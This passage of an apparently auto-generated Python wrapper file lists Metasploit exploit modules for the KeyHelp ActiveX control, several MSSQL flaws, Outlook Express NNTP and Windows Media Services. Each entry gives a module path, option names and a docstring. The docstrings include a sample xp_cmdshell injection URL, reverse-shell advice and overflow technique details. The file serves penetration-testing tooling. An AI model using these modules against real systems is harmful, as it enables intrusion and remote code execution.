			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_keyhelp_launchtripane_exec(object):
		"""
		
          This module exploits a code execution vulnerability in the KeyScript ActiveX
        control from keyhelp.ocx. It is packaged in several products or GE, such as
        Proficy Historian 4.5, 4.0, 3.5, and 3.1, Proficy HMI/SCADA 5.1 and 5.0, Proficy
        Pulse 1.0, Proficy Batch Execution 5.6, and SI7 I/O Driver between 7.20 and 7.42.
        When the control is installed with these products, the function "LaunchTriPane"
        will use ShellExecute to launch "hh.exe", with user controlled data as parameters.
        Because of this, the "-decompile" option can be abused to write arbitrary files on
        the remote system.

          Code execution can be achieved by first uploading the payload to the remote
        machine, and then upload another mof file, which enables Windows Management
        Instrumentation service to execute it. Please note that this module currently only
        works for Windows before Vista.

        On the other hand, the target host must have the WebClient service (WebDAV
        Mini-Redirector) enabled. It is enabled and automatically started by default on
        Windows XP SP3
      
		"""

		path = 'windows/browser/keyhelp_launchtripane_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_mssql_mssql_payload_sqli(object):
		"""
		
          This module will execute an arbitrary payload on a Microsoft SQL
        Server, using a SQL injection vulnerability.

        Once a vulnerability is identified this module
        will use xp_cmdshell to upload and execute Metasploit payloads.
        It is necessary to specify the exact point where the SQL injection
        vulnerability happens. For example, given the following injection:

        http://www.example.com/show.asp?id=1;exec xp_cmdshell 'dir';--&cat=electrical

        you would need to set the following path:
        set GET_PATH /showproduct.asp?id=1;[SQLi];--&cat=foobar

        In regard to the payload, unless there is a closed port in the web server,
        you dont want to use any "bind" payload, specially on port 80, as you will
        stop reaching the vulnerable web server host. You want a "reverse" payload, probably to
        your port 80 or to any other outbound port allowed on the firewall.
        For privileged ports execute Metasploit msfconsole as root.

        Currently, three delivery methods are supported.

        First, the original method uses Windows 'debug.com'. File size restrictions are
        avoidied by incorporating the debug bypass method presented by SecureStat at
        Defcon 17. Since this method invokes ntvdm, it is not available on x64 systems.

        A second method takes advantage of the Command Stager subsystem. This allows using
        various techniques, such as using a TFTP server, to send the executable. By default
        the Command Stager uses 'wcsript.exe' to generate the executable on the target.

        Finally, ReL1K's latest method utilizes PowerShell to transmit and recreate the
        payload on the target.

        NOTE: This module will leave a payload executable on the target system when the
        attack is finished.

      
		"""

		path = 'windows/mssql/mssql_payload_sqli'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			required_METHOD = 'METHOD'
			required_GET_PATH = 'GET_PATH'
			DATA = 'DATA'
			COOKIE = 'COOKIE'
			HEX2BINARY = 'HEX2BINARY'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			CMDSTAGER_FLAVOR = 'CMDSTAGER::FLAVOR'
			CMDSTAGER_DECODER = 'CMDSTAGER::DECODER'
			required_DELIVERY = 'DELIVERY'

	class windows_mssql_ms09_004_sp_replwritetovarbin(object):
		"""
		
          A heap-based buffer overflow can occur when calling the undocumented
        "sp_replwritetovarbin" extended stored procedure. This vulnerability affects
        all versions of Microsoft SQL Server 2000 and 2005, Windows Internal Database,
        and Microsoft Desktop Engine (MSDE) without the updates supplied in MS09-004.
        Microsoft patched this vulnerability in SP3 for 2005 without any public
        mention.

        An authenticated database session is required to access the vulnerable code.
        That said, it is possible to access the vulnerable code via an SQL injection
        vulnerability.

        This exploit smashes several pointers, as shown below.

        1. pointer to a 32-bit value that is set to 0
        2. pointer to a 32-bit value that is set to a length influcenced by the buffer
          length.
        3. pointer to a 32-bit value that is used as a vtable pointer. In MSSQL 2000,
          this value is referenced with a displacement of 0x38. For MSSQL 2005, the
          displacement is 0x10. The address of our buffer is conveniently stored in
          ecx when this instruction is executed.
        4. On MSSQL 2005, an additional vtable ptr is smashed, which is referenced with
          a displacement of 4. This pointer is not used by this exploit.

        This particular exploit replaces the previous dual-method exploit. It uses
        a technique where the value contained in ecx becomes the stack. From there,
        return oriented programming is used to normalize the execution state and
        finally execute the payload via a "jmp esp". All addresses used were found
        within the sqlservr.exe memory space, yielding very reliable code execution
        using only a single query.

        NOTE: The MSSQL server service does not automatically restart by default. That
        said, some exceptions are caught and will not result in terminating the process.
        If the exploit crashes the service prior to hijacking the stack, it won't die.
        Otherwise, it's a goner.
      
		"""

		path = 'windows/mssql/ms09_004_sp_replwritetovarbin'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			USERNAME = 'USERNAME'
			PASSWORD = 'PASSWORD'
			required_TDSENCRYPTION = 'TDSENCRYPTION'
			required_USE_WINDOWS_AUTHENT = 'USE_WINDOWS_AUTHENT'
			HEX2BINARY = 'HEX2BINARY'
			required_DOMAIN = 'DOMAIN'

	class windows_mssql_mssql_clr_payload(object):
		"""
		
        This module executes an arbitrary native payload on a Microsoft SQL
        server by loading a custom SQL CLR Assembly into the target SQL
        installation, and calling it directly with a base64-encoded payload.

        The module requires working credentials in order to connect directly to the
        MSSQL Server.

        This method requires the user to have sufficient privileges to install a custom
        SQL CRL DLL, and invoke the custom stored procedure that comes with it.

        This exploit does not leave any binaries on disk.

        Tested on MS SQL Server versions: 2005, 2012, 2016 (all x64).
      
		"""

		path = 'windows/mssql/mssql_clr_payload'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			USERNAME = 'USERNAME'
			PASSWORD = 'PASSWORD'
			required_TDSENCRYPTION = 'TDSENCRYPTION'
			required_USE_WINDOWS_AUTHENT = 'USE_WINDOWS_AUTHENT'
			HEX2BINARY = 'HEX2BINARY'
			required_DOMAIN = 'DOMAIN'
			required_DATABASE = 'DATABASE'

	class windows_mssql_ms09_004_sp_replwritetovarbin_sqli(object):
		"""
		
          A heap-based buffer overflow can occur when calling the undocumented
        "sp_replwritetovarbin" extended stored procedure. This vulnerability affects
        all versions of Microsoft SQL Server 2000 and 2005, Windows Internal Database,
        and Microsoft Desktop Engine (MSDE) without the updates supplied in MS09-004.
        Microsoft patched this vulnerability in SP3 for 2005 without any public
        mention.

        This exploit smashes several pointers, as shown below.

        1. pointer to a 32-bit value that is set to 0
        2. pointer to a 32-bit value that is set to a length influcenced by the buffer
          length.
        3. pointer to a 32-bit value that is used as a vtable pointer. In MSSQL 2000,
          this value is referenced with a displacement of 0x38. For MSSQL 2005, the
          displacement is 0x10. The address of our buffer is conveniently stored in
          ecx when this instruction is executed.
        4. On MSSQL 2005, an additional vtable ptr is smashed, which is referenced with
          a displacement of 4. This pointer is not used by this exploit.

        This particular exploit replaces the previous dual-method exploit. It uses
        a technique where the value contained in ecx becomes the stack. From there,
        return oriented programming is used to normalize the execution state and
        finally execute the payload via a "jmp esp". All addresses used were found
        within the sqlservr.exe memory space, yielding very reliable code execution
        using only a single query.

        NOTE: The MSSQL server service does not automatically restart by default. That
        said, some exceptions are caught and will not result in terminating the process.
        If the exploit crashes the service prior to hijacking the stack, it won't die.
        Otherwise, it's a goner.
      
		"""

		path = 'windows/mssql/ms09_004_sp_replwritetovarbin_sqli'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			required_METHOD = 'METHOD'
			required_GET_PATH = 'GET_PATH'
			DATA = 'DATA'
			COOKIE = 'COOKIE'
			HEX2BINARY = 'HEX2BINARY'

	class windows_mssql_lyris_listmanager_weak_pass(object):
		"""
		
          This module exploits a weak password vulnerability in the
        Lyris ListManager MSDE install. During installation, the 'sa'
        account password is set to 'lminstall'. Once the install
        completes, it is set to 'lyris' followed by the process
        ID of the installer. This module brute forces all possible
        process IDs that would be used by the installer.
      
		"""

		path = 'windows/mssql/lyris_listmanager_weak_pass'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			USERNAME = 'USERNAME'
			PASSWORD = 'PASSWORD'
			required_TDSENCRYPTION = 'TDSENCRYPTION'
			required_USE_WINDOWS_AUTHENT = 'USE_WINDOWS_AUTHENT'
			HEX2BINARY = 'HEX2BINARY'
			required_DOMAIN = 'DOMAIN'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_mssql_mssql_linkcrawler(object):
		"""
		
          This module can be used to crawl MS SQL Server database links and deploy
        Metasploit payloads through links configured with sysadmin privileges using a
        valid SQL Server Login.

          If you are attempting to obtain multiple reverse shells using this module we
        recommend setting the "DisablePayloadHandler" advanced option to "true", and setting
        up a exploit/multi/handler to run in the background as a job to support multiple incoming
        shells.

          If you are interested in deploying payloads to spefic servers this module also
        supports that functionality via the "DEPLOYLIST" option.

          Currently, the module is capable of delivering payloads to both 32bit and 64bit
        Windows systems via powershell memory injection methods based on Matthew Graeber's
        work. As a result, the target server must have powershell installed. By default,
        all of the crawl information is saved to a CSV formatted log file and MSF loot so
        that the tool can also be used for auditing without deploying payloads.
      
		"""

		path = 'windows/mssql/mssql_linkcrawler'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			USERNAME = 'USERNAME'
			required_PASSWORD = 'PASSWORD'
			required_TDSENCRYPTION = 'TDSENCRYPTION'
			required_USE_WINDOWS_AUTHENT = 'USE_WINDOWS_AUTHENT'
			HEX2BINARY = 'HEX2BINARY'
			required_DOMAIN = 'DOMAIN'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			CMDSTAGER_FLAVOR = 'CMDSTAGER::FLAVOR'
			CMDSTAGER_DECODER = 'CMDSTAGER::DECODER'
			DEPLOY = 'DEPLOY'
			DEPLOYLIST = 'DEPLOYLIST'
			required_POWERSHELL_PATH = 'POWERSHELL_PATH'

	class windows_mssql_mssql_payload(object):
		"""
		
          This module executes an arbitrary payload on a Microsoft SQL Server by using
        the "xp_cmdshell" stored procedure. Currently, three delivery methods are supported.

        First, the original method uses Windows 'debug.com'. File size restrictions are
        avoidied by incorporating the debug bypass method presented by SecureStat at
        Defcon 17. Since this method invokes ntvdm, it is not available on x64 systems.

        A second method takes advantage of the Command Stager subsystem. This allows using
        various techniques, such as using a TFTP server, to send the executable. By default
        the Command Stager uses 'wcsript.exe' to generate the executable on the target.

        Finally, ReL1K's latest method utilizes PowerShell to transmit and recreate the
        payload on the target.

        NOTE: This module will leave a payload executable on the target system when the
        attack is finished.
      
		"""

		path = 'windows/mssql/mssql_payload'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			USERNAME = 'USERNAME'
			PASSWORD = 'PASSWORD'
			required_TDSENCRYPTION = 'TDSENCRYPTION'
			required_USE_WINDOWS_AUTHENT = 'USE_WINDOWS_AUTHENT'
			HEX2BINARY = 'HEX2BINARY'
			required_DOMAIN = 'DOMAIN'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			CMDSTAGER_FLAVOR = 'CMDSTAGER::FLAVOR'
			CMDSTAGER_DECODER = 'CMDSTAGER::DECODER'
			required_METHOD = 'METHOD'

	class windows_mssql_ms02_039_slammer(object):
		"""
		
          This is an exploit for the SQL Server 2000 resolution
        service buffer overflow. This overflow is triggered by
        sending a udp packet to port 1434 which starts with 0x04 and
        is followed by long string terminating with a colon and a
        number. This module should work against any vulnerable SQL
        Server 2000 or MSDE install (pre-SP3).

      
		"""

		path = 'windows/mssql/ms02_039_slammer'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			USERNAME = 'USERNAME'
			PASSWORD = 'PASSWORD'
			required_TDSENCRYPTION = 'TDSENCRYPTION'
			required_USE_WINDOWS_AUTHENT = 'USE_WINDOWS_AUTHENT'
			HEX2BINARY = 'HEX2BINARY'
			required_DOMAIN = 'DOMAIN'

	class windows_mssql_ms02_056_hello(object):
		"""
		
          By sending malformed data to TCP port 1433, an
        unauthenticated remote attacker could overflow a buffer and
        possibly execute code on the server with SYSTEM level
        privileges. This module should work against any vulnerable
        SQL Server 2000 or MSDE install (< SP3).

      
		"""

		path = 'windows/mssql/ms02_056_hello'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			USERNAME = 'USERNAME'
			PASSWORD = 'PASSWORD'
			required_TDSENCRYPTION = 'TDSENCRYPTION'
			required_USE_WINDOWS_AUTHENT = 'USE_WINDOWS_AUTHENT'
			HEX2BINARY = 'HEX2BINARY'
			required_DOMAIN = 'DOMAIN'

	class windows_nntp_ms05_030_nntp(object):
		"""
		
          This module exploits a stack buffer overflow in the news reader of Microsoft
        Outlook Express.
      
		"""

		path = 'windows/nntp/ms05_030_nntp'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_mmsp_ms10_025_wmss_connect_funnel(object):
		"""
		
          This module exploits a stack buffer overflow in the Windows Media
        Unicast Service version 4.1.0.3930 (NUMS.exe). By sending a specially
        crafted FunnelConnect request, an attacker can execute arbitrary code
